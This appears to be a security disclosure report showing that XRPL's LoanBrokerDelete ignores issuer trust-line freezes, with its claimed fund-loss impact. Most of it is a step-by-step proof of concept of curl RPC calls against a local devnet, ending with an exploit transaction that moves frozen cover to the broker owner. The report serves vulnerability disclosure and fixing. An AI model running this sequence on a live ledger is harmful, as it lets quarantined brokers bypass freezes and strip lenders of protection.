# Title
Frozen LoanBrokerDelete payout lets quarantined brokers drain first-loss capital

# Description

## Brief/Intro
`LoanBrokerDelete` allows a broker owner to delete the broker and collect all remaining first-loss capital even when the issuer has frozen that owner's trust line. On mainnet this would let a quarantined broker empty their cover balance, stripping lenders of protection and causing direct fund loss.

## Vulnerability Details
- `LoanBrokerDelete::preclaim` ensures only that the caller owns the broker and that `sfOwnerCount == 0`; it never calls `checkFreeze` or `checkDeepFrozen` on the owner before proceeding (see `src/xrpld/app/tx/detail/LoanBrokerDelete.cpp`, lines 39-63). The issuer's intent to block payouts is therefore ignored during admission.
- `LoanBrokerDelete::doApply` unconditionally executes `accountSend(view(), brokerPseudoID, account_, coverAvailable, ...)`, transferring the entire `sfCoverAvailable` balance to the owner without re-evaluating freeze state (same file, lines 103-114). There is no conditional branch that would redirect the payout back into cover or abort the transaction.
- `checkFreeze` is the helper that enforces issuer freeze flags (`lsfLowFreeze/lsfHighFreeze`); `checkDeepFrozen` covers only deep-freeze. Because neither is invoked, a trust line frozen by the issuer still receives the funds (`include/xrpl/ledger/View.h`, lines 287-314). Normal freeze flags are the primary compliance control for broker quarantines.
- The ledger send pipeline assumes callers already validated freeze restrictions. `accountSend` delegates to `rippleCreditIOU`, which performs no additional freeze checks (`src/libxrpl/ledger/View.cpp`, lines 1908-2049). Once `LoanBrokerDelete` calls `accountSend`, the transfer is guaranteed to succeed even when the issuer froze the owner.
- Expected behaviour: if the issuer freezes the owner's trust line, any attempt to withdraw cover should fail (or at least redirect to the pseudo-account). Actual behaviour: `LoanBrokerDelete` reports `tesSUCCESS`, removes the broker, and moves the frozen funds to the owner.

## Impact Details
- A frozen broker can drain all first-loss capital (`sfCoverAvailable`), leaving the vault under-collateralized. Lenders suffer direct financial loss once defaults occur because the mandated buffer no longer exists.
- Issuer compliance controls are undermined: freeze flags intended to quarantine brokers do not stop fund extraction.
- In-scope impacts satisfied: `Drainage and/or stealing of funds from ledger objects (vault, first loss capital)` and `Direct loss of funds`.

## References
- `src/xrpld/app/tx/detail/LoanBrokerDelete.cpp`
- `include/xrpl/ledger/View.h`
- `src/libxrpl/ledger/View.cpp`

# Proof of Concept

1. **Create deterministic accounts** (issuer `I`, broker owner `B`, borrower `U`) on a devnet node:
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"issuer freeze demo"}]}'
   curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"broker freeze demo"}]}'
   curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"borrower freeze demo"}]}'
   ```
2. **Fund each account** from the genesis master so they can pay fees:
   ```sh
   for acct in <ISSUER_ACCOUNT> <BROKER_ACCOUNT> <BORROWER_ACCOUNT>; do
     curl -s -X POST http://127.0.0.1:5005 -d "{\
       \"method\":\"submit\",\
       \"params\":[{\
         \"secret\":\"snoPBrXtMeMyMHUVTgbuqAfg1SUTb\",\
         \"tx_json\":{\
           \"TransactionType\":\"Payment\",\
           \"Account\":\"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh\",\
           \"Destination\":\"$acct\",\
           \"Amount\":\"1000000000\"\
         }\
       }]\
     }" | jq '.result.engine_result'
   done
   ```
3. **Set up trust lines and fund the broker with IOUs** so the pseudo-account can hold cover:
   ```sh
   # Broker trust line to issuer IOU
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"TrustSet",
         "Account":"<BROKER_ACCOUNT>",
         "LimitAmount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000000000000"
         },
         "Flags":262144
       }
     }]
   }' | jq '.result.engine_result'

   # Borrower trust line (needed later for LoanSet)
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BORROWER_SECRET>",
       "tx_json":{
         "TransactionType":"TrustSet",
         "Account":"<BORROWER_ACCOUNT>",
         "LimitAmount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000000000000"
         }
       }
     }]
   }' | jq '.result.engine_result'

   # Issuer transfers IOUs to broker owner
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<ISSUER_SECRET>",
       "tx_json":{
         "TransactionType":"Payment",
         "Account":"<ISSUER_ACCOUNT>",
         "Destination":"<BROKER_ACCOUNT>",
         "Amount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"5000000"
         },
         "Flags":131072
       }
     }]
   }' | jq '.result.engine_result'
   ```
4. **Create the vault and loan broker, then deposit cover:**
   ```sh
   # VaultCreate
   VAULT_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"VaultCreate",
         "Account":"<BROKER_ACCOUNT>",
         "Asset":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>"
         },
         "Scale":6
       }
     }]
   }' | jq -r '.result.tx_json.hash')

   VAULT_ID=$(curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"tx",
     "params":[{"transaction":"'"$VAULT_HASH"'"}]
   }' | jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="Vault").CreatedNode.LedgerIndex')

   # LoanBrokerSet
   BROKER_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanBrokerSet",
         "Account":"<BROKER_ACCOUNT>",
         "VaultID":"'"$VAULT_ID"'",
         "CoverRateMinimum":1
       }
     }]
   }' | jq -r '.result.tx_json.hash')

   BROKER_ID=$(curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"tx",
     "params":[{"transaction":"'"$BROKER_HASH"'"}]
   }' | jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="LoanBroker").CreatedNode.LedgerIndex')

   # Deposit cover into pseudo-account
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanBrokerCoverDeposit",
         "Account":"<BROKER_ACCOUNT>",
         "LoanBrokerID":"'"$BROKER_ID"'",
         "Amount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000000"
         }
       }
     }]
   }' | jq '.result.engine_result'
   ```
5. **Freeze the broker owner trust line** from the issuer account and verify it is active:
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<ISSUER_SECRET>",
       "tx_json":{
         "TransactionType":"TrustSet",
         "Account":"<ISSUER_ACCOUNT>",
         "LimitAmount":{
           "currency":"USD",
           "issuer":"<BROKER_ACCOUNT>",
           "value":"0"
         },
         "Flags":1048576
       }
     }]
   }' | jq '.result.engine_result'

   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"account_lines",
     "params":[{"account":"<BROKER_ACCOUNT>","peer":"<ISSUER_ACCOUNT>"}]
   }' | jq '.result.lines[0].freeze'
   ```
   The call above returns `true`, confirming the freeze flag is set.
6. **Ensure the broker has no outstanding loans** (delete any loans if necessary) so that `sfOwnerCount == 0`. Deposit cover remains in `sfCoverAvailable`.
7. **Exploit: call LoanBrokerDelete while frozen.** 
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanBrokerDelete",
         "Account":"<BROKER_ACCOUNT>",
         "LoanBrokerID":"'"$BROKER_ID"'"
       }
     }]
   }' | jq '.result.engine_result'
   ```
   The transaction returns `tesSUCCESS`.
8. **Observe the outcome.** Query the broker ledger entry and the owner trust line:
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"ledger_entry",
     "params":[{"index":"'"$BROKER_ID"'"}]
   }'

   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"account_lines",
     "params":[{"account":"<BROKER_ACCOUNT>","peer":"<ISSUER_ACCOUNT>"}]
   }'
   ```
   Results: `sfCoverAvailable` is now zero because the broker was deleted, and the frozen trust line balance increased by the exact amount of cover that was supposedly quarantined. The issuer freeze was bypassed, proving the vulnerability.
